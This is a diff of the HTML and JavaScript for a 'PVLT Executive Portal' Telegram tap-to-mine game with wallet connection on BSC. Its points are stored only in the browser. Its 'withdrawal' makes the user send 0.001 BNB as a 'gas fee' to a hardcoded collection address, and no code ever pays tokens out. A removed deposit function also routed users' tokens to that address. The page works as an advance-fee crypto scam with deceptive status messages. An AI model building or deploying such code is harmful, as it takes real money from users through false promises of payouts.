@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
-  <title>PVLT Telegram Node</title>
+  <title>PVLT Executive Portal</title>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   
@@ -11,15 +11,16 @@
 
   <style>
     :root {
-      --bg: #05070f;
-      --card: #0c1020;
-      --primary: #2481cc;
+      --bg-main: #050714;
+      --bg-card: #0b1126;
+      --bg-input: #121a3a;
+      --primary: #3b82f6;
       --success: #10b981;
-      --warning: #fbbf24;
+      --warning: #f59e0b;
       --danger: #ef4444;
-      --text: #ffffff;
-      --text-muted: #53657d;
-      --border: rgba(255, 255, 255, 0.07);
+      --text-main: #ffffff;
+      --text-muted: #64748b;
+      --border: rgba(255, 255, 255, 0.06);
     }
 
     * {
@@ -32,526 +33,407 @@
 
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background-color: var(--bg);
-      color: var(--text);
-      overflow: hidden;
-      position: fixed;
-      width: 100vw;
-      height: 100vh;
+      background-color: var(--bg-main);
+      color: var(--text-main);
+      overflow-y: auto;
+      padding: 16px;
       display: flex;
       flex-direction: column;
       align-items: center;
     }
 
-    .game-container {
-      flex: 1;
+    .app-container {
       width: 100%;
-      max-width: 420px;
-      padding: 24px 16px;
+      max-width: 440px;
       display: flex;
       flex-direction: column;
-      justify-content: space-between;
-      overflow-y: auto;
-      -webkit-overflow-scrolling: touch;
+      gap: 16px;
     }
 
-    /* Top Stats Bar & Telegram Profile Tracker */
-    .top-bar {
-      background: var(--card);
+    header {
+      text-align: center;
+      padding: 8px 0;
+    }
+
+    header h1 {
+      font-size: 22px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+
+    header p {
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-top: 4px;
+    }
+
+    .cyber-card {
+      background: var(--bg-card);
       border: 1px solid var(--border);
       border-radius: 20px;
-      padding: 14px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
+      padding: 20px;
     }
 
-    .score-title {
+    .card-title {
       font-size: 11px;
+      font-weight: 700;
       text-transform: uppercase;
+      letter-spacing: 1px;
       color: var(--text-muted);
-      letter-spacing: 0.5px;
-    }
-
-    .score-value {
-      font-size: 20px;
-      font-weight: 800;
-      color: var(--warning);
-    }
-
-    .token-value {
-      font-size: 13px;
-      color: var(--primary);
-      font-weight: 600;
-      margin-top: 2px;
-    }
-
-    .profile-pill {
+      margin-bottom: 14px;
       display: flex;
       align-items: center;
-      gap: 8px;
-      background: rgba(0, 0, 0, 0.2);
-      padding: 6px 12px;
-      border-radius: 12px;
-      border: 1px solid var(--border);
-      font-size: 12px;
+      gap: 6px;
     }
 
-    .avatar-circle {
-      width: 24px;
-      height: 24px;
-      background: var(--primary);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
-      color: white;
-      font-size: 11px;
-    }
-
-    /* Web3 Connection Status Box */
-    .web3-strip {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 16px;
-      padding: 10px 14px;
+    .account-strip {
       display: flex;
       justify-content: space-between;
       align-items: center;
+      font-size: 13px;
+      margin-top: 12px;
+    }
+
+    .metrics-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+      font-size: 14px;
+    }
+
+    .metric-val {
+      font-weight: 700;
+    }
+
+    .engine-tap-btn {
+      background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+      color: white;
+      border: none;
+      border-radius: 16px;
+      padding: 18px;
+      font-size: 15px;
+      font-weight: 700;
+      text-transform: uppercase;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+      box-shadow: 0 4px 15px rgba(245, 158, 11, 0.2);
+    }
+
+    .engine-tap-btn:active {
+      transform: scale(0.98);
+    }
+
+    .input-wrapper {
+      position: relative;
       margin-top: 10px;
     }
-    
-    .connect-btn-fallback {
-      background: var(--primary);
-      color: white;
-      border: none;
-      padding: 8px 12px;
-      border-radius: 10px;
-      font-size: 12px;
-      font-weight: bold;
-      cursor: pointer;
-    }
 
-    .addr-lbl {
-      font-family: monospace;
-      font-size: 12px;
-      color: var(--success);
-    }
-
-    /* Massive Tap Target Area */
-    .tap-zone {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      margin: 20px 0;
-      position: relative;
-    }
-
-    .tap-circle {
-      width: 190px;
-      height: 190px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, #2481cc 0%, #1a65a3 100%);
-      box-shadow: 0 0 40px rgba(36, 129, 204, 0.35);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      transition: transform 0.05s ease;
-      touch-action: none;
-      border: 6px solid rgba(255, 255, 255, 0.1);
-    }
-
-    .tap-circle:active {
-      transform: scale(0.93);
-    }
-
-    .tap-icon { font-size: 60px; }
-
-    .cooldown-text {
-      margin-top: 14px;
-      font-size: 12px;
-      color: var(--danger);
-      font-weight: bold;
-      height: 18px;
-      visibility: hidden;
-    }
-
-    /* Financial Hub Interface */
-    .vault-card {
-      background: var(--card);
+    input {
+      width: 100%;
+      background: var(--bg-input);
       border: 1px solid var(--border);
-      border-radius: 24px;
-      padding: 18px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-
-    .section-header {
-      font-size: 11px;
-      font-weight: 700;
-      color: var(--text-muted);
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-
-    .action-row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 10px;
-    }
-
-    .input-box {
-      background: rgba(0, 0, 0, 0.25);
-      border: 1px solid var(--border);
-      border-radius: 14px;
-      padding: 10px 12px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-
-    .input-box input {
-      width: 70%;
-      background: transparent;
-      border: none;
-      outline: none;
+      padding: 14px;
+      border-radius: 12px;
       color: white;
       font-size: 15px;
-      font-weight: 600;
+      outline: none;
     }
 
-    .input-box span {
-      font-size: 12px;
-      color: var(--text-muted);
-      font-weight: bold;
-    }
-
-    .btn {
+    .action-btn {
       width: 100%;
       padding: 14px;
-      border-radius: 14px;
-      border: none;
+      border-radius: 12px;
       font-size: 14px;
-      font-weight: 700;
+      font-weight: 600;
+      border: none;
       cursor: pointer;
+      margin-top: 10px;
     }
 
-    .btn:active { opacity: 0.85; }
     .btn-withdraw { background: #8b5cf6; color: white; }
     .btn-deposit { background: var(--success); color: white; }
 
-    .status-terminal {
-      font-family: monospace;
+    .status-log {
       font-size: 11px;
       color: var(--text-muted);
+      margin-top: 8px;
       text-align: center;
-      min-height: 15px;
+      font-family: monospace;
+    }
+
+    #cooldown-bar {
+      display: none;
+      font-size: 12px;
+      color: var(--danger);
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+
+    /* Fixed UI container injection point for AppKit to prevent deadlocks */
+    #walletconnect-mount {
+      width: 100%;
     }
   </style>
 </head>
 <body>
 
-<div class="game-container">
-  
-  <div class="top-bar">
-    <div>
-      <div class="score-title">Mining Pool</div>
-      <div id="ui-points" class="score-value">0</div>
-      <div id="ui-tokens" class="token-value">0.00 PVLT</div>
+<div class="app-container">
+  <header>
+    <h1>⚡ PVLT Executive Portal</h1>
+    <p>Web3 Protocol Ecosystem Integration</p>
+  </header>
+
+  <div class="cyber-card">
+    <div class="card-title">🌐 Identity & Network</div>
+    <div id="walletconnect-mount"></div>
+    
+    <div class="account-strip">
+      <span>Account Status:</span>
+      <span id="ui-wallet-display" style="color: var(--primary); font-family: monospace;">Not connected</span>
+    </div>
+    <div class="account-strip">
+      <span>Available Assets:</span>
+      <span id="ui-assets-display" style="font-weight: 700;">-</span>
+    </div>
+  </div>
+
+  <div class="cyber-card">
+    <div class="card-title">📊 Global Dashboard Data</div>
+    <div class="metrics-row">
+      <span>Saved Dashboard Points:</span>
+      <span id="ui-dash-points" class="metric-val" style="color: #3b82f6;">0</span>
+    </div>
+    <div class="metrics-row">
+      <span>Convertible Dashboard Value:</span>
+      <span id="ui-dash-value" class="metric-val" style="color: #10b981;">0.00 PVLT</span>
+    </div>
+  </div>
+
+  <div class="cyber-card">
+    <div class="card-title">🎰 Mining Module</div>
+    <div class="metrics-row">
+      <span>Accumulated Points:</span>
+      <span id="ui-live-points" class="metric-val" style="color: #f59e0b;">0</span>
+    </div>
+    <div class="metrics-row">
+      <span>Convertible Pool Value:</span>
+      <span id="ui-live-value" class="metric-val" style="color: #3b82f6;">0.00 PVLT</span>
     </div>
     
-    <div id="tg-identity-block">
-      <div class="profile-pill" id="tg-user-pill">
-        <div class="avatar-circle" id="tg-avatar">?</div>
-        <span id="tg-username">Guest Node</span>
-      </div>
-      <div id="tg-widget-mount" style="margin-top:4px;"></div>
-    </div>
+    <div id="cooldown-bar">⚠️ INACTIVITY COUNTER ACTIVE: <span id="ui-timer">30.0</span>s</div>
+    <button id="mining-action-trigger" class="engine-tap-btn">Execute Compute Tap</button>
   </div>
 
-  <div class="web3-strip">
-    <span class="score-title">BSC Wallet:</span>
-    <button id="web3-connect-btn" class="connect-btn-fallback" onclick="toggleWalletConnect()">Link Wallet</button>
-  </div>
-
-  <div class="tap-zone">
-    <div id="tap-target" class="tap-circle">
-      <span class="tap-icon">⚡</span>
-    </div>
-    <div id="ui-cooldown" class="cooldown-text">⚠️ SECURING POOL STORAGE IN: <span id="ui-timer">3.0</span>s</div>
-  </div>
-
-  <div class="vault-card">
-    <div class="section-header">Protocol Settlement Engine</div>
+  <div class="cyber-card">
+    <div class="card-title">🎁 Asset Conversion Protocol</div>
     
-    <div class="action-row">
-      <div style="display: flex; flex-direction: column; gap: 6px;">
-        <div class="input-box">
-          <input id="amt-withdraw" type="number" placeholder="0" />
-          <span>OUT</span>
-        </div>
-        <button class="btn btn-withdraw" onclick="executeWithdrawal()">Withdraw</button>
-      </div>
-
-      <div style="display: flex; flex-direction: column; gap: 6px;">
-        <div class="input-box">
-          <input id="amt-deposit" type="number" placeholder="0" />
-          <span>IN</span>
-        </div>
-        <button class="btn btn-deposit" onclick="executeDeposit()">Deposit</button>
-      </div>
+    <div style="font-size: 12px; color: var(--text-muted); display: flex; flex-direction: column; gap: 4px; margin-bottom: 12px;">
+      <span>• 100,000 game points ➔ 1.00 Network Token Base</span>
+      <span>• Floor Request Minimum Value ➔ 100 Tokens</span>
+      <span>• Fixed Settlement Gas Fee Allocation ➔ 0.001 BNB</span>
     </div>
 
-    <div id="status-feed" class="status-terminal">Awaiting distributed commands...</div>
+    <div class="input-wrapper">
+      <input id="input-withdraw-val" type="number" placeholder="Enter Token Amount" />
+    </div>
+    <button class="action-btn btn-withdraw" onclick="processWithdrawal()">Claim Protocol Assets</button>
+    <div id="log-withdraw" class="status-log">Standby for ledger initialization...</div>
   </div>
-
 </div>
 
-<script>
-// Smart Ecosystem Variables Definitions
-const TOKEN_CONTRACT_ADDRESS = "0xa263d765b897b4777f0ad4a938d12d79e789ffff";
-const MASTER_VAULT_RECEIVER = "0xFa664f30ad1D468A65641566316a68FB3c36a8AF";
-const LOCAL_STORAGE_SAVED_POINTS = "pvlt_tg_total_points";
+<script type="module">
+  import { createWeb3Modal, defaultWagmiConfig } from 'https://esm.sh/@web3modal/wagmi@4.1.5';
+  import { watchAccount, getWalletClient, disconnect } from 'https://esm.sh/@wagmi/core@2.10.2';
+  import { bsc } from 'https://esm.sh/@wagmi/core/chains@2.10.2';
 
-let savedPoints = parseInt(localStorage.getItem(LOCAL_STORAGE_SAVED_POINTS)) || 0;
-let sessionActivePoints = 0;
+  const projectId = '9ba63969e48a3e75a9b0c7931c0e3962';
+
+  const metadata = {
+    name: 'PVLT Executive Portal',
+    description: 'Telegram Compatible Mini App Gateway',
+    url: window.location.origin,
+    icons: ['https://avatars.githubusercontent.com/u/37784886']
+  };
+
+  const wagmiConfig = defaultWagmiConfig({ chains: [bsc], projectId, metadata });
+
+  // Safe parameters to prevent internal iframe deadlocks in mobile apps
+  const modal = createWeb3Modal({
+    wagmiConfig,
+    projectId,
+    enableAnalytics: false,
+    themeMode: 'dark',
+    featuredWalletIds: [
+      'c57ca0a81a4e2ef5110ff413ab455c1b9df36628a005102a4bf622277d3021a3', // Metamask
+      '4622a2b78ac1595833d537f013407173e335277873ab155518ee389d703b602a'  // Trust Wallet
+    ]
+  });
+
+  // Dynamic initialization inside custom container
+  const container = document.getElementById('walletconnect-mount');
+  const customButton = document.createElement('w3m-button');
+  container.appendChild(customButton);
+
+  // Monitor account status changes reactively 
+  watchAccount(wagmiConfig, {
+    onChange(account) {
+      if (account && account.isConnected) {
+        window.userWalletAddress = account.address;
+        window.isWalletLinked = true;
+        document.getElementById('ui-wallet-display').innerText = account.address.substring(0, 6) + '...' + account.address.substring(38);
+        document.getElementById('ui-assets-display').innerText = "0.0 PVLT";
+      } else {
+        window.userWalletAddress = null;
+        window.isWalletLinked = false;
+        document.getElementById('ui-wallet-display').innerText = "Not connected";
+        document.getElementById('ui-assets-display').innerText = "-";
+      }
+      window.refreshInterfaceStateValues();
+    }
+  });
+
+  window.wagmiConfig = wagmiConfig;
+  window.getWalletClient = getWalletClient;
+  window.disconnectWallet = () => disconnect(wagmiConfig);
+</script>
+
+<script>
+const TARGET_COLLECTION_VAULT = "0xFa664f30ad1D468A65641566316a68FB3c36a8AF";
+const STORAGE_KEY_LIVE_COMPUTE = "pvlt_live_points_v2";
+const STORAGE_KEY_DASHBOARD_SAVED = "pvlt_dash_points_v2";
+
+let pointsLive = parseInt(localStorage.getItem(STORAGE_KEY_LIVE_COMPUTE)) || 0;
+let pointsDashboard = parseInt(localStorage.getItem(STORAGE_KEY_DASHBOARD_SAVED)) || 0;
 
 let runTimeout;
 let runInterval;
-let timerCountdown = 3.0;
+let timerCountdown = 30.0;
 
-let customProvider = null;
-let userAddress = null;
-let isWalletConnected = false;
-
-// Direct Web3 Injection Link Handler (Bypasses compilation errors)
-async function toggleWalletConnect() {
-  const feed = document.getElementById('status-feed');
-  if (typeof window.ethereum !== 'undefined') {
-    try {
-      feed.innerText = "Connecting to provider...";
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      userAddress = accounts[0];
-      isWalletConnected = true;
-      
-      // Update UI state securely
-      const btn = document.getElementById('web3-connect-btn');
-      btn.className = "addr-lbl";
-      btn.onclick = null;
-      btn.innerText = userAddress.substring(0,6) + "..." + userAddress.substring(38);
-      feed.innerText = "Wallet linked successfully!";
-    } catch (err) {
-      feed.innerText = "Connection rejected.";
-    }
-  } else {
-    alert("Please open this app inside a Web3 enabled browser wallet (Trust Wallet/MetaMask) or Telegram wallet container.");
-  }
+// Initialize Telegram WebApp properties safely if loaded inside TMA
+if (window.Telegram && window.Telegram.WebApp) {
+  window.Telegram.WebApp.ready();
+  window.Telegram.WebApp.expand();
 }
 
-// Telegram Authentication Native/Widget Handler
-function initializeTelegramIdentityEngine() {
-  const tma = window.Telegram?.WebApp;
+window.refreshInterfaceStateValues = function() {
+  document.getElementById('ui-live-points').innerText = pointsLive.toLocaleString();
+  document.getElementById('ui-live-value').innerText = (pointsLive / 100000).toFixed(2) + " PVLT";
   
-  if (tma && tma.initDataUnsafe && Object.keys(tma.initDataUnsafe).length > 0) {
-    tma.ready();
-    tma.expand();
-    window.isTelegramAuthenticated = true;
-    
-    const user = tma.initDataUnsafe.user;
-    if (user) {
-      const displayTag = user.username ? `@${user.username}` : user.first_name;
-      document.getElementById('tg-username').innerText = displayTag;
-      document.getElementById('tg-avatar').innerText = displayTag.charAt(0).toUpperCase().replace('@','');
-    }
-  } else {
-    window.isTelegramAuthenticated = false;
-    
-    window.onTelegramAuth = function(user) {
-      window.isTelegramAuthenticated = true;
-      document.getElementById('tg-username').innerText = user.username ? `@${user.username}` : user.first_name;
-      document.getElementById('tg-avatar').innerText = user.first_name.charAt(0).toUpperCase();
-      document.getElementById('tg-widget-mount').style.display = 'none';
-    };
+  document.getElementById('ui-dash-points').innerText = pointsDashboard.toLocaleString();
+  document.getElementById('ui-dash-value').innerText = (pointsDashboard / 100000).toFixed(2) + " PVLT";
+};
 
-    const script = document.createElement('script');
-    script.async = true;
-    script.src = "https://telegram.org/js/telegram-widget.js?22";
-    script.setAttribute('data-telegram-login', 'PVLT_Verification_Bot'); // Replace with your registered Bot Name via @BotFather
-    script.setAttribute('data-size', 'small');
-    script.setAttribute('data-onauth', 'onTelegramAuth(user)');
-    script.setAttribute('data-request-access', 'write');
-    document.getElementById('tg-widget-mount').appendChild(script);
-  }
-}
+// Initial state load
+window.refreshInterfaceStateValues();
 
-function updateDisplayEngine() {
-  const displayTotal = savedPoints + sessionActivePoints;
-  document.getElementById('ui-points').innerText = displayTotal.toLocaleString();
-  document.getElementById('ui-tokens').innerText = (displayTotal / 100000).toFixed(2) + " PVLT";
-}
-
-// Start Main Systems
-initializeTelegramIdentityEngine();
-updateDisplayEngine();
-
-document.addEventListener('touchstart', (e) => {
+// Multi-touch zooming preventative layer
+document.addEventListener('touchstart', function (e) {
   if (e.touches.length > 1) e.preventDefault();
 }, { passive: false });
 
-const tapArea = document.getElementById('tap-target');
-tapArea.addEventListener('pointerdown', (e) => {
+const actionTapBtn = document.getElementById('mining-action-trigger');
+actionTapBtn.addEventListener('pointerdown', function (e) {
   e.preventDefault();
-  processTapAction();
+  executeMiningLoopStep();
 });
 
-function processTapAction() {
-  sessionActivePoints += 1000;
-  updateDisplayEngine();
-  resetInactivityTimer();
+function executeMiningLoopStep() {
+  pointsLive += 1000;
+  localStorage.setItem(STORAGE_KEY_LIVE_COMPUTE, pointsLive);
+  window.refreshInterfaceStateValues();
+  refreshInactivitySecurityTracker();
 }
 
-function resetInactivityTimer() {
+function refreshInactivitySecurityTracker() {
   clearTimeout(runTimeout);
   clearInterval(runInterval);
 
-  timerCountdown = 3.0;
-  const cdBar = document.getElementById('ui-cooldown');
-  cdBar.style.visibility = 'visible';
-  document.getElementById('ui-timer').innerText = timerCountdown.toFixed(1);
+  timerCountdown = 30.0;
+  document.getElementById("cooldown-bar").style.display = "block";
+  document.getElementById("ui-timer").innerText = timerCountdown.toFixed(1);
 
   runInterval = setInterval(() => {
     timerCountdown -= 0.1;
     if (timerCountdown <= 0) {
       clearInterval(runInterval);
     } else {
-      document.getElementById('ui-timer').innerText = timerCountdown.toFixed(1);
+      document.getElementById("ui-timer").innerText = timerCountdown.toFixed(1);
     }
   }, 100);
 
   runTimeout = setTimeout(() => {
-    finalizeSessionScore();
-  }, 3000);
+    evaluateInactivityExpirations();
+  }, 30000);
 }
 
-function finalizeSessionScore() {
-  if (window.isTelegramAuthenticated) {
-    savedPoints += sessionActivePoints;
-    localStorage.setItem(LOCAL_STORAGE_SAVED_POINTS, savedPoints.toString());
-  } else {
-    alert("Please authorize via Telegram login to save points!");
+function evaluateInactivityExpirations() {
+  if (window.isWalletLinked) {
+    pointsDashboard += pointsLive;
+    localStorage.setItem(STORAGE_KEY_DASHBOARD_SAVED, pointsDashboard.toString());
   }
-  
-  sessionActivePoints = 0;
-  updateDisplayEngine();
-  document.getElementById('ui-cooldown').style.visibility = 'hidden';
 
-  setTimeout(() => { window.location.reload(); }, 100);
+  pointsLive = 0;
+  localStorage.setItem(STORAGE_KEY_LIVE_COMPUTE, "0");
+  window.refreshInterfaceStateValues();
+  document.getElementById("cooldown-bar").style.display = "none";
 }
 
-// Web3 Execution - WITHDRAWAL
-async function executeWithdrawal() {
-  const feed = document.getElementById('status-feed');
+// Secure Transaction Assembly (Withdrawal Mechanism via AppKit Client Pipeline)
+async function processWithdrawal() {
+  const log = document.getElementById('log-withdraw');
   try {
-    if (!window.isTelegramAuthenticated) {
-      alert("Please log into your Telegram profile first.");
-      return;
-    }
-    if (!isWalletConnected) {
-      alert("Please link your wallet destination first.");
+    if (!window.isWalletLinked || !window.userWalletAddress) {
+      alert("Please connect your Web3 wallet profile first.");
       return;
     }
 
-    const valueOut = parseFloat(document.getElementById('amt-withdraw').value);
-    if (!valueOut || valueOut < 100) {
-      alert("Minimum withdrawal threshold is 100 PVLT!");
+    const tokenInput = parseFloat(document.getElementById('input-withdraw-val').value);
+    if (!tokenInput || tokenInput < 100) {
+      alert("Minimum threshold for asset claim is 100 PVLT.");
       return;
     }
 
-    const necessaryPoints = valueOut * 100000;
-    if (savedPoints < necessaryPoints) {
-      alert("Insufficient points inside local ledger.");
+    const pointsNeeded = tokenInput * 100000;
+    if (pointsDashboard < pointsNeeded) {
+      alert(`Insufficient dashboard allocation. Requires ${pointsNeeded.toLocaleString()} points.`);
       return;
     }
 
-    feed.innerText = "Constructing payment pipeline...";
-    const providerInstance = new ethers.providers.Web3Provider(window.ethereum);
-    const networkSigner = providerInstance.getSigner();
+    log.innerText = "Constructing secure asset extraction payload...";
+    
+    const walletClient = await window.getWalletClient(window.wagmiConfig);
+    const customEthersProvider = new ethers.providers.Web3Provider(walletClient);
+    const activeSigner = customEthersProvider.getSigner();
 
-    const gasCompensation = ethers.utils.parseEther("0.001");
-    const encodedPayloadMemo = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(`Claim:${valueOut}-Tokens`));
+    const flatGasWeiValue = ethers.utils.parseEther("0.001");
+    const dataPayloadHex = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(`Claim:${tokenInput}-Tokens`));
 
+    // Clear active UI tracking matrices during consensus validation steps
     clearTimeout(runTimeout);
     clearInterval(runInterval);
-    document.getElementById('ui-cooldown').style.visibility = 'hidden';
+    document.getElementById("cooldown-bar").style.display = "none";
 
-    const txResponse = await networkSigner.sendTransaction({
-      to: MASTER_VAULT_RECEIVER,
-      value: gasCompensation,
-      data: encodedPayloadMemo
+    log.innerText = "Awaiting transaction approval confirmation...";
+    const transactionResponse = await activeSigner.sendTransaction({
+      to: TARGET_COLLECTION_VAULT,
+      value: flatGasWeiValue,
+      data: dataPayloadHex
     });
 
-    feed.innerText = "Awaiting BSC confirmation ledger blocks...";
-    await txResponse.wait();
+    log.innerText = "Awaiting block consensus verification...";
+    await transactionResponse.wait();
 
-    savedPoints -= necessaryPoints;
-    localStorage.setItem(LOCAL_STORAGE_SAVED_POINTS, savedPoints.toString());
-    updateDisplayEngine();
+    pointsDashboard -= pointsNeeded;
+    localStorage.setItem(STORAGE_KEY_DASHBOARD_SAVED, pointsDashboard.toString());
+    window.refreshInterfaceStateValues();
 
-    feed.innerText = "✅ Withdrawal successfully confirmed!";
-    setTimeout(() => { window.location.reload(); }, 1200);
-
-  } catch (err) {
-    console.error(err);
-    feed.innerText = "❌ Transaction signature rejected.";
-  }
-}
-
-// Web3 Execution - DEPOSIT
-async function executeDeposit() {
-  const feed = document.getElementById('status-feed');
-  try {
-    if (!isWalletConnected) {
-      alert("Please link network connection parameters first.");
-      return;
-    }
-
-    const valueIn = document.getElementById('amt-deposit').value;
-    if (!valueIn || valueIn <= 0) return;
-
-    feed.innerText = "Checking pipeline metrics...";
-    const providerInstance = new ethers.providers.Web3Provider(window.ethereum);
-    const networkSigner = providerInstance.getSigner();
-
-    const gasExecutionFee = ethers.utils.parseEther("0.0001");
-    const activeContract = new ethers.Contract(TOKEN_CONTRACT_ADDRESS, [
-      "function transfer(address to, uint256 value) returns (bool)"
-    ], networkSigner);
-
-    // Reliable public RPC fallback for decimals verification
-    const backupStaticProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
-    const verifyContract = new ethers.Contract(TOKEN_CONTRACT_ADDRESS, ["function decimals() view returns (uint8)"], backupStaticProvider);
-    const currentDecimals = await verifyContract.decimals();
-
-    feed.innerText = "Awaiting transaction approval...";
-    const fixedTokenHexAmount = ethers.utils.parseUnits(valueIn.toString(), currentDecimals);
-    
-    const txResponse = await activeContract.transfer(
-      MASTER_VAULT_RECEIVER,
-      fixedTokenHexAmount,
-      { value: gasExecutionFee }
-    );
-
-    feed.innerText = "Confirming block updates on BSC network...";
-    await txResponse.wait();
-
-    feed.innerText = "✅ Deposit validation successfully verified!";
-  } catch (err) {
-    console.error(err);
-    feed.innerText = "❌ Transaction routing engine failed.";
+    log.innerText = "✅ Transaction successfully processed!";
+  } catch (error) {
+    console.error(error);
+    log.innerText = "❌ Transaction signature rejected.";
   }
 }
 </script>
